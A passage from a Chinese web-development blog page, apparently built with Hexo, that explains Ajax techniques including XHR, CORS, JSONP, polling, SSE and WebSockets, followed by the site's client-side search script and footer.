但是建议开发者不要使用已有的字段名称, 防止后端获取失败, 因为有些浏览器禁止这么做xhr.send(null);\nGet请求// get请求要注意的就是URL后面参数的问题, 保险起见, 参数值和参数名最好要用encodeURIComponent编码再传参xhr.open(\"get\", \"URL?v1=1&amp;v2=2\", true);\nPost请求与GET请求差异的是, POST请求更被期望于把数据作为请求的主体提交到后端.那么xhr.open的第一个参数自然就要改成”post”.\n它可以传送任何你想发送到服务器的字符串.\n默认情况下，服务器对 POST 请求和提交 Web 表单的请求并不会一视同仁。因此，服务器端必须有程序来读取发送过来的原始数据，并从中解析出有用的部分。不过，我们可以使用 XHR 来模仿表单提交：首先将 Content-Type 头部信息设置为 application/x-www-form-urlencoded，也就是表单提交时的内容类型，其次是以适当的格式创建一个字符串。\nxhr.open(\"post\",url,true);xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(formData);// formData必须经过序列化\n这样就实现了ajax模拟表单提交.\nXMLHttpRequest2级鉴于 XHR 已经得到广泛接受，成为了事实标准，W3C 也若手制定相应的标准以规范其行为。XMLHttpRequest 1 级只是把已有的 XHR 对象的实现细节描述了出来。而 XMLHttpRequest 2 级则进一步发展了 XHR。并非所有浏览器都完整地实现了 XMLHttpRequest 2 级规范，但所有浏览器都实现了它规定的部分内容。\nFormData现代 Web 应用中频繁使用的一项功能就是表单数据的序列化，XMLHttpRequest 2 级为此定义了FormData 类型。FormData 为序列化表单以及创建与表单格式相同的数据（用于通过 XHR 传输）提供了便利。下面的代码创建了一个 FormData 对象，并向其中添加了一些数据。var data = new FormData(); data.append(\"name\", \"Nicholas\");//也可以参照下面方式传参:var data2 = new FormData(document.forms[0]);\t//这样就更方便传递给xhr.send了.\n超时设定虽然我们可以用xhr.status来判断是否提示请求错误, 但请求时间一旦过程, 显然有一个超时设定更为合理:\nvar xhr = new XMLHttpRequest();xhr.onreadystatechange = function(){   if (xhr.readyState == 4){    try {      if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304){ alert(xhr.responseText);      } else {        alert(\"Request was unsuccessful: \" + xhr.status);      }    } catch (ex){    //假设由 ontimeout 事件处理程序处理  }  }};xhr.open(\"get\", \"timeout.php\", true);xhr.timeout = 1000; //将超时设置为 1 秒钟（仅适用于 IE8+）xhr.ontimeout = function(){  alert(\"Request did not return in a second.\");};xhr.send(null);\noverrideMimeType方法Firefox 最早引入了 overrideMimeType()方法，用于重写 XHR 响应的 MIME 类型。这个方法后来也被纳入了 XMLHttpRequest 2 级规范。因为返回响应的 MIME 类型决定了 XHR 对象如何处理它，所以提供一种方法能够重写服务器返回的 MIME 类型是很有用的。\n比如，服务器返回的 MIME 类型是 text/plain，但数据中实际包含的是 XML。根据 MIME 类型， 即使数据是 XML，responseXML 属性中仍然是 null。通过调用 overrideMimeType()方法，可以保证把响应当作 XML 而非纯文本来处理。var xhr = createXHR(); xhr.open(\"get\", \"text.php\", true); xhr.overrideMimeType(\"text/xml\"); //必须在send()方法之前xhr.send(null);\n这个例子强迫 XHR 对象将响应当作 XML 而非纯文本来处理。\n进度事件Progress Events 规范是 W3C 的一个工作草案，定义了与客户端服务器通信有关的事件。这些事件最早其实只针对 XHR 操作，但目前也被其他 API 借鉴。有以下 6 个进度事件。\n\nloadstart：在接收到响应数据的第一个字节时触发。\nprogress：在接收响应期间持续不断地触发。\nerror：在请求发生错误时触发。\nabort：在因为调用 abort()方法而终止连接时触发。\nload：在接收到完整的响应数据时触发。\nloadend：在通信完成或者触发 error、abort 或 load 事件后触发。\n\n事件触发顺序正如上面排序.\nload事件load事件显然是用来代替readystatechange事件的, 这就意味着不用检查xhr.readyState, 也会有性能上提升.\nvar xhr = new XMLHttpRequest();xhr.onload = function(){ //只要浏览器接收到服务器的响应，不管其状态如何，都会触发 load 事件。  if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304){    alert(xhr.responseText);  } else {    alert(\"Request was unsuccessful: \" + xhr.status);  }};xhr.open(\"get\", \"altevents.php\", true); xhr.send(null);\nprogress事件Mozilla 对 XHR 的另一个革新是添加了 progress 事件，这个事件会在浏览器接收新数据期间周期性地触发。而 onprogress 事件处理程序会接收到一个 event 对象，其 target 属性是 XHR 对象，但包含若三个额外的属性：lengthComputable、position 和 totalSize。其中，lengthComputable 是一个表示进度信息是否可用的布尔值，position 表示已经接收的字节数，totalSize 表示根据Content-Length 响应头部确定的预期字节数。有了这些信息，我们就可以为用户创建一个进度指示器:\nvar xhr = new XMLHttpRequest();xhr.onload = function(event){  if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304){    alert(xhr.responseText);  } else {    alert(\"Request was unsuccessful: \" + xhr.status);  }};// 注意这个事件也要和onload事件一样写在xhr.open前面保证兼容xhr.onprogress = function(event){  var divStatus = document.getElementById(\"status\");   if (event.lengthComputable){    divStatus.innerHTML = \"Received \" + event.position + \" of \" + event.totalSize +\" bytes\";  }};xhr.open(\"get\", \"altevents.php\", true); xhr.send(null);\n跨域资源共享CORS通过 XHR 实现 Ajax 通信的一个主要限制，来源于跨域安全策略。默认情况下，XHR 对象只能访问与包含它的页面位于同一个域中的资源。\nCORS（Cross-Origin Resource Sharing，跨源资源共享）是 W3C 的一个工作草案，定义了在必须访问跨源资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想: 就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。\n\n现代浏览器下的CORS看起来和Ajax代码没什么区别(实际也没啥区别), 它的关键点在于后端的支持. \n\n比如一个简单的使用 GET 或 POST 发送的请求，它没有自定义的头部，而主体内容是 text/plain。在发送该请求时，需要给它附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。下面是 Origin 头部的一个示例：Origin: http://www.nczonline.net\n如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发”*”）。例如:\nAccess-Control-Allow-Origin: http://www.nczonline.netAccess-Control-Allow-Credentials: true;    // 是否接受用户凭据\n如果没有这个头部，或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。\nIE对CORS的实现以下是 XDR 与 XHR 的一些不同之处。\n\ncookie 不会随请求发送，也不会随响应返回。\n只能设置请求头部信息中的 Content-Type 字段。\n不能访问响应头部信息。\n只支持 GET 和 POST 请求。var xdr = new XDomainRequest(); xdr.onload = function(){  alert(xdr.responseText);};xdr.onerror = function(){   alert(\"An error occurred.\");};xdr.timeout = 1000; xdr.ontimeout = function(){  alert(\"Request took too long.\");};xdr.open(\"get\", \"http://www.somewhere-else.com/page/\"); xdr.contentType = \"application/x-www-form-urlencoded\";  //只能在这里设置xdr.send(\"name1=value1&amp;name2=value2\");\n\n\n其他浏览器对CORS的实现现代浏览器都通过 XMLHttpRequest 对象实现了对 CORS 的原生支持。在尝试打开不同来源的资源时，无需额外编写代码就可以触发这个行为。要请求位于另一个域中的资源，使用标准的 XHR 对象并在 open()方法中传入绝对 URL 即可，例如：\nvar xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){  if (xhr.readyState == 4){    if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304){       alert(xhr.responseText);    } else {      alert(\"Request was unsuccessful: \" + xhr.status);    }  }};xhr.withCredentials = true;    // 如果要带用户凭据则设置这个属性xhr.open(\"get\", \"http://www.somewhere-else.com/page/\", true);xhr.send(null);\n与 IE 中的 XDR 对象不同，通过跨域 XHR 对象可以访问 status 和 statusText 属性，而且还支持同步请求。跨域 XHR 对象也有一些限制，但为了安全这些限制是必需的。以下就是这些限制。\n\n不能使用 setRequestHeader()设置自定义头部。\n默认情况不能发送和接收 cookie。\n调用 getAllResponseHeaders()方法总会返回空字符串。\n由于无论同源请求还是跨源请求都使用相同的接口，因此对于本地资源，最好使用相对 URL，在访问远程资源时再使用绝对 URL。这样做能消除歧义，避免出现限制访问头部或本地 cookie 信息等问题。\n\nPreflighted Request字面理解可以翻译成: 预检请求.  \n书中讲得不是很好, 我按照自己的意思解释下:浏览器的同源策略浏览器会限制从脚本发起的跨域HTTP请求，像XMLHttpRequest和Fetch都遵循同源策略。\n浏览器限制跨域请求一般有两种方式：\n\n浏览器限制发起跨域请求\n跨域请求可以正常发起，但是返回的结果被浏览器拦截了\n\n一般浏览器都是第二种方式限制跨域请求，那就是说请求已到达服务器，并有可能对数据库里的数据进行了操作，但是返回的结果被浏览器拦截了，那么我们就获取不到返回结果，这是一次失败的请求，但是可能对数据库里的数据产生了影响。\n为了防止这种情况的发生，规范要求，对这种可能对服务器数据产生副作用的HTTP请求方法，浏览器必须先使用OPTIONS方法发起一个预检请求，从而获知服务器是否允许该跨域请求：如果允许，就发送带数据的真实请求；如果不允许，则阻止发送带数据的真实请求。\n 点击此处可以查阅预检请求的触发条件: https://my.oschina.net/ososchina/blog/672556 \n带凭据的请求参考上面的代码, 分别前后端加代码\n\n前端: xhr.withCredentials = true\n后端: Access-Control-Allow-Credentials: true\n\n跨浏览器的CORS做兼容处理, 代码略\n其他跨域技术在 CORS 出现以前，要实现跨域 Ajax 通信颇费一些周折。开发人员想出了一些办法，利用 DOM 中能够执行跨域请求的功能，在不依赖 XHR 对象的情况下也能发送某种请求。虽然 CORS 技术已经无处不在，但开发人员自已发明的这些技术仍然被广泛使用，毕竟这样不需要修改服务器端代码\n图像ping上述第一种跨域请求技术是使用标签。我们知道，一个网页可以从任何网页中加载图像，不用担心跨域不跨域。这也是在线广告跟踪浏览量的主要方式。正如第 13 章讨论过的，也可以动态地创建图像，使用它们的 onload 和 onerror 事件处理程序来确定是否接收到了响应。\n动态创建图像经常用于图像 Ping。图像 Ping 是与服务器进行简单、单向的跨域通信的一种方式。请求的数据是通过查询字符串形式发送的，而响应可以是任意内容，但通常是像素图或 204 响应。通过图像 Ping，浏览器得不到任何具体的数据，但通过侦听 load 和 error 事件，它能知道响应是什么时候接收到的。来看下面的例子。var img = new Image();img.onload = img.onerror = function(){ alert(\"Done!\");};img.src = \"http://www.example.com/test?name=Nicholas\";\n这里创建了一个 Image 的实例，然后将 onload 和 onerror 事件处理程序指定为同一个函数。这样无论是什么响应，只要请求完成，就能得到通知。请求从设置 src 属性那一刻开始，而这个例子在请求中发送了一个 name 参数。\n图像 Ping 最常用于跟踪用户点击页面或动态广告曝光次数。图像 Ping 有两个主要的缺点，一是只能发送 GET 请求，二是无法访问服务器的响应文本。因此，图像 Ping 只能用于浏览器与服务器间的单向通信。\nJSONPJSONP全称JSON with padding, 是应用 JSON 的一种新方法， 在后来的 Web 服务中非常流行。JSONP 看起来与 JSON 差不多.callback({\"name\":\"testdog\"})\n原理实际上就是先在网站页面上定义好某个函数, 然后用动态创建script标签的方式把函数句给添加进来, 达到立即执行的效果.\n值得注意的是你用的JSONP是从其他域请求回来的JS代码, 所以要注意安全问题.\nCometComet是Dojo创始人Alex Russell提出的一种叫法, 指的是一种跟高级的Ajax技术(有人称之为服务器推送).\nAjax 是一种从页面向服务器请求数据的技术，而 Comet 则是一种服务器向页面推送数据的技术。Comet 能够让信息近乎实时地被推送到页面上，非常适合处理体育比赛的分数和股票报价。\n有两种实现 Comet 的方式：\n\n长轮询: 长轮询和传统轮询(也称为短轮询: 用定时器和xhr就能实现)相反.\nHttp流: 就是浏览器向服务器发送一个请求，而服务器保持连接打开，然后周期性地向浏览器发送数据。\n\n我们依次给到长短轮询的代码\n\n短轮询示例:\nshortpolling.html&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;短轮询(传统轮询)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;script&gt;    function ajax(configObj){      var c = configObj;      var xhr = new XMLHttpRequest();      xhr.open(c.method,c.url,true);      xhr.send(null)      xhr.onload = function() {        if ((xhr.status &gt;=200 &amp;&amp; xhr.status &lt;300)||xhr.status ==304) {          var res = JSON.parse(xhr.responseText)          c.sucess &amp;&amp; c.sucess(res);        }      }    }    setInterval(function(){      ajax({        method:'get',        url:'shortpolling.php',        sucess:function(data){          console.log('服务器响应时间:',data.res)        }      })    },1000)  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\nshortpolling.php&lt;?php  header('Content-type: text/json');  $arr = [      'res' =&gt; time()  ];  echo json_encode($arr); ?&gt;\n\n长轮询示例:longpolling.html&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;长轮询&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;script type=\"text/javascript\"&gt;    // 实现一个长轮询    function ajax(configObj){      var c = configObj;      var xhr = new XMLHttpRequest();      xhr.open(c.method,c.url,true);      xhr.send(null)      xhr.onload = function() {        if ((xhr.status &gt;=200 &amp;&amp; xhr.status &lt;300)||xhr.status ==304) {          var res = (xhr.responseText)          c.sucess &amp;&amp; c.sucess(res);          xhr.onload = null; // 性能优化        }      }      xhr.onerror = function(e){        console.log(e)        c.fail &amp;&amp; c.fail(xhr,xhr.responseText,e);      }    }    function longPolling(){      var _fn = arguments.callee;      ajax({        method:'get',        url:'longpolling.php?time='+Date.parse(new Date())/1000,        sucess:function(data){          console.log(data)          _fn();        },        fail:function(xhr,responseText,err){        }      })    }    longPolling();  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\nlongpolling.php&lt;?phpheader('Content-type: application/json');set_time_limit(0);//无限请求超时时间$time = $_GET['time'];while (true) {  sleep(3);  $i = rand(0,100);  if ($i &gt; 0 &amp;&amp; $i &lt; 50) {    $responseTime = time();    echo json_encode(array(\"resultNum\"=&gt;$i,\"responseTime\"=&gt;$responseTime-$time));    exit();  } else { // 模拟没有数据变化，将休眠 hold住连接    sleep(5);    echo json_encode(array(\"noData\"=&gt;true));    exit();  }}\n长短轮询的差别可以通过浏览器控制点的请求面板看他们之间的差异. \n\nHTTP流 :http流是Comet的另一种实现, 它的思路就是若不断从服务器接收数据，readyState 的值会周期性地变为 3。当 readyState 值变为 3 时，responseText 属性中就会保存接收到的所有数据。\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;HTTP Streaming Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;p&gt;This example must be run on a server to work properly and will not work in IE.&lt;/p&gt;  &lt;script&gt;    function createStreamingClient(url, progress, finished){      var xhr = new XMLHttpRequest(),        received = 0;      xhr.open(\"get\", url, true);      xhr.onreadystatechange = function(){        var result;        if (xhr.readyState == 3){          //get only the new data and adjust counter          result = xhr.responseText.substring(received);          received += result.length;          //call the progress callback          progress(result);        } else if (xhr.readyState == 4){          finished(xhr.responseText);        }      };      xhr.send(null);      return xhr;    }    var client = createStreamingClient(\"streaming.php\", function(data){      alert(\"Received: \" + data);    }, function(data){      alert(\"Done!\");    });  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n服务器发送事件SSE（Server-Sent Events，服务器发送事件）是围绕只读 Comet 交互推出的 API 或者模式。SSE API 用于创建到服务器的单向连接，服务器通过这个连接可以发送任意数量的数据。服务器响应的 MIME 类型必须是 text/event-stream，而且是浏览器中的 JavaScript API 能解析格式输出。SSE 支持短轮询、长轮询和 HTTP 流，而且能在断开连接时自动确定何时重新连接。\n比起之前comet的实现, 操作自然更加简便.\nvar src = new EventSource(\"api.php\")    src.onmessage=function(evt){      var data = evt.data;      console.log(data)    };\n注意，传入的 URL 必须与创建对象的页面同源（相同的 URL 模式、域及端口）。EventSource 的实例有一个 readyState 属性，值为 0 表示正连接到服务器，值为 1 表示打开了连接，值为 2 表示关闭了连接。\n相关API:\n\nopen：在建立连接时触发。\nmessage：在从服务器接收到新事件时触发。\nerror：在无法建立连接时触发。\n\n默认情况下，EventSource 对象会保持与服务器的活动连接。如果连接断开，还会重新连接。这就意味若 SSE 适合长轮询和 HTTP 流。如果想强制立即断开连接并且不再重新连接，可以调用 close() 方法。\nsrc.close();\nWebSocketsWeb Sockets 的目标是在一个单独的持久连接上提供全双工、双向通信。在 JavaScript 中创建了 Web Socket 之后，会有一个 HTTP 请求发送到浏览器以发起连接。在取得服务器响应后，建立的连接会从 HTTP 协议交换为 Web Socket 协议。(ws:// or wss://)\n也就是说，使用标准的 HTTP 服务器无法实现 Web Sockets，只有支持这种协议的专门服务器才能正常工作。\n使用上述协议而非HTTP协议的好处是，能够在客户端和服务器之间发送非常少量的数据，而不必担心 HTTP 那样字节级的开销。由于传递的数据包很小，因此 Web Sockets 非常适合移动应用。毕竟对移动应用而言，带宽和网络延迟都是关键问题。\n\nWeb Sockets API要创建 Web Socket，先实例一个 WebSocket 对象并传入要连接的 URL：var socket = new WebSocket(\"ws://www.example.com/server.php\");//必须是绝对地址\n\n\n注意，必须给 WebSocket 构造函数传入绝对 URL。同源策略对 Web Sockets 不适用，因此可以通过它打开到任何站点的连接。\n实例化了 WebSocket 对象后，浏览器就会马上尝试创建连接。与 XHR 类似，WebSocket 也有一个表示当前状态的 readyState 属性。不过，这个属性的值与 XHR 并不相同，而是如下所示:\n\nWebSocket.OPENING (0)：正在建立连接。\nWebSocket.OPEN (1)：已经建立连接。\nWebSocket.CLOSING (2)：正在关闭连接。\nWebSocket.CLOSE (3)：已经关闭连接。\n\nWebSocket 没有 readystatechange 事件；不过，它有其他事件，对应若不同的状态。readyState 的值永远从 0 开始。要关闭 Web Socket 连接，可以在任何时候调用 close()方法。\nsocket.close(); //readyState 的值立即变为 2（正在关闭），而在关闭连接后就会变成 3。\n\n发送和接收数据\n\nvar data = \"Hello world!\";var message = {  time: new Date(),   text: \"Hello world!\",  clientId: \"asdfp8734rew\"};var socket = new WebSocket(\"ws://www.example.com/server.php\");// 发送数据socket.send(data);  //只接受纯文本数据// socket.send(JSON.stringify(message)); // 复杂数据必须经过序列化 //接受数据socket.onmessage = function(event){   var data = event.data;  //返回的也是字符串};// 其他APIsocket.onopen = function(){  alert(\"Connection established.\");};socket.onerror = function(){   alert(\"Connection error.\");};socket.onclose = function(){   alert(\"Connection closed.\");};\nSSE 与WebSockets面对某个具体的用例，在考虑是使用 SSE 还是使用 Web Sockets 时，可以考虑如下几个因素。首先， 你是否有自由度建立和维护 Web Sockets 服务器？因为 Web Socket 协议不同于 HTTP，所以现有服务器不能用于 Web Socket 通信。SSE 倒是通过常规 HTTP 通信，因此现有服务器就可以满足需求。\n第二个要考虑的问题是到底需不需要双向通信。如果用例只需读取服务器数据（如比赛成绩），那么 SSE 比较容易实现。如果用例必须双向通信（如聊天室），那么 Web  Sockets 显然更好。别忘了，在不能选择 Web Sockets 的情况下，组合 XHR 和 SSE 也是能实现双向通信的\n安全为确保通过 XHR 访问的 URL 安全，通行的做法就是验证发送请求者是否有权限访问相应的资源。有下列几种方式可供选择。\n\n要求以 SSL 连接来访问可以通过 XHR 请求的资源。\n要求每一次请求都要附带经过相应算法计算得到的验证码。请注意，下列措施对防范 CSRF 攻击不起作用。\n要求发送 POST 而不是 GET 请求——很容易改变。\n检查来源 URL 以确定是否可信——来源记录很容易伪造。\n基于 cookie 信息进行验证——同样很容易伪造。XHR 对象也提供了一些安全机制，虽然表面上看可以保证安全，但实际上却相当不可靠。实际上， 前面介绍的 open()方法还能再接收两个参数：要随请求一起发送的用户名和密码。带有这两个参数的请求可以通过 SSL 发送给服务器上的页面, 但是要禁止明文get请求发送账号密码.\n\n\n本文完, 以下有两篇文章可以查阅\n https://segmentfault.com/a/1190000011549088 https://segmentfault.com/a/1190000000423616#articleHeader8","url":"/2019/04/09/JSbook21/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook21/"}]

        let searchMod = {
          searchTitle: true, //  是否在标题中搜索
          searchContent: 1, // 是否在内容中搜索
          contentPieces: 2, // 内容切割块数
          excludes: ['{{', '}}', '{', '}', '.', '/', '\\', '。'], // 粗略过滤部分字符串
          contentDecoration: 50, // 内容命中关键字增加前后50个字
          roughFetch: false, // 是否粗略提取, 仅对文本内容有效
          trimStr(str) {
            return str.trim().toLowerCase()
          },
          init(input) {
            input.addEventListener('input', (e) => {
              let searchText = this.trimStr(input.value)
              this.fetchTxtFromDB(searchText, searchData)
            });
          },
          fetchTxtFromDB(searchText, DB) {
            let resultArr = []

            if (searchText) {
              let searchTextArr = searchText.split(/[\s\-]+/); // 非首尾空格分割词条
              searchTextArr = searchTextArr.filter((item) => {
                return !this.excludes.includes(item);
              })

              if (searchTextArr.length > 1) {
                searchTextArr.push(searchText); // 保留原始词条做完全匹配
              }

              resultArr = DB.filter((item) => {
                let articleTitle = this.trimStr(item.title);
                let titleHitArr = []
                item.tmpTitleArr = []
                item._title = ''


                let articleContent = this.trimStr(item.content);
                let contentHitArr = []
                item.tmpContentArr = []
                item.indexArr = []  // 词条在内容中第一次出现的位置
                item._content = '' // 存储已经高亮关键字的原文
                item._contentSliceArr = [] // 存储截取后的原文碎片

                searchTextArr.map((one, index) => { // 求出searchTextArr有多少个命中的词条
                  if (this.searchTitle) {
                    let b = articleTitle.indexOf(one) > -1;
                    b && titleHitArr.push(one)
                  }

                  if (this.searchContent) {
                    let b2 = articleContent.indexOf(one) > -1
                    b2 && contentHitArr.push(one)
                  }
                })

                if (this.searchTitle && titleHitArr.length) {
                  titleHitArr.map((one, index) => {
                    let keyWordHtml = this.keyWordTpl().replace(/{{searchText}}/, one),
                      titleArrWithoutKeyWord = (!index ? articleTitle : item.tmpTitleArr[index - 1]).split(one), // 用数组切割的方式把所有文本内包含的关键词替换出来, 下一次的分割依赖上一次分割结果
                      highlightTxt = titleArrWithoutKeyWord.join(keyWordHtml);

                    item.tmpTitleArr.push(highlightTxt); // 记录前一次的结果,用于下一次计算
                    item._title = highlightTxt; // 最后一次为最终结果
                  })

                  delete item.tmpTitleArr
                }

                if (this.searchContent && contentHitArr.length) {
                  contentHitArr.map((one, index) => {
                    if (this.roughFetch) { // 先高亮后截取(可能造成高亮标签切割问题)
                      let keyWordHtml = this.keyWordTpl().replace(/{{searchText}}/, one),
                        contentArrWithoutKeyWord = (!index ? articleContent : item.tmpContentArr[index - 1]).split(one),
                        highlightTxt = contentArrWithoutKeyWord.join(keyWordHtml);

                      item.tmpContentArr.push(highlightTxt);
                      item._content = highlightTxt;
                    } else {
                      item.indexArr.push({
                        start: articleContent.indexOf(one), // 记录词条第一次出现的位置，和词条的长度
                        length: one.length,
                        str: one,
                      })
                    }
                  })

                  item.indexArr.map((one, index) => { // 有可能把<b>标签给切割了,造成样式异常, 需要另外处理
                    let keyWordEndPosition = one.start + one.length // 词条的结束位置,用于计算截取长度
                    let content = this.roughFetch ? item._content : item.content;
                    let contentLen = content.length;

                    if (one.start > this.contentDecoration) {
                      let highLightEndPosition = keyWordEndPosition + this.contentDecoration
                      highLightEndPosition = highLightEndPosition > contentLen ? contentLen : highLightEndPosition
                      item._contentSliceArr.push('...'+content.slice(one.start - this.contentDecoration, highLightEndPosition) + '...')
                    } else {
                      let highLightEndPosition = keyWordEndPosition + this.contentDecoration * 2
                      highLightEndPosition = highLightEndPosition > contentLen ? contentLen : highLightEndPosition
                      item._contentSliceArr.push('...'+content.slice(0, highLightEndPosition) + '...')
                    }
                  })

                  if (!this.roughFetch) {
                    contentHitArr.map((one, index) => {
                      let keyWordHtml = this.keyWordTpl().replace(/{{searchText}}/, one),
                        contentArrWithoutKeyWord = (!index ? item._contentSliceArr.join('<i style="display:block;padding-top:10px"></i>') : item.tmpContentArr[index - 1]).split(one),
                        highlightTxt = contentArrWithoutKeyWord.join(keyWordHtml);

                      item.tmpContentArr.push(highlightTxt);
                      item._content = highlightTxt
                    })
                  }

                  delete item.tmpContentArr
                  delete item._contentSliceArr
                  delete item.indexArr
                }

                return (this.searchTitle && titleHitArr.length) || (this.searchContent && contentHitArr.length)
              })
            }

            this.resultArr = resultArr;
            this.render(JresList, Jcount, resultArr)
          },
          render(ele, countEle, resultArr) {
            let htmlArr = resultArr.map((item) => {
              return this.itemTpl()
                .replace(/{{url}}/g, item.url)
                .replace(/{{title}}/g, item._title || item.title)
                .replace(/{{content}}/g, item._content|| (item.content.slice(0,this.contentDecoration*3) +'...'))
            })

            ele.innerHTML = htmlArr.join('')
            countEle.innerHTML = htmlArr.length
          },
          itemTpl() {
            return `
            <li class="item">
              <a target="_blank" href="{{url}}">
              <div class="search-result-title">{{title}}</div>
              <p class="search-result search-result-link">{{content}}</p>
              </a>
            </li>
          `;
          },
          keyWordTpl() {
            return `<b class="search-keyword">{{searchText}}</b>`
          }
        }

      searchMod.init(Jinput)
    </script>
  </div>
</article>
        </div>
        
        
      </div>
      <footer id="footer" class="inner">
        © 2021 - 测试狗 -
        <span id="busuanzi_container_site_pv">PV <span id="busuanzi_value_site_pv"></span></span>
        <p>Powered by <a href="https://hexo.io/">Hexo</a> & <a href="https://github.com/thinkerchan/hexo-theme-greyshade">GreyShade</a></p>
      </footer>
    </div>
  </div>
  
  <script async defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
  <script async defer src="https://s5.cnzz.com/z_stat.php?id=1276809529&web_id=1276809529"></script>
  
</body>
</html>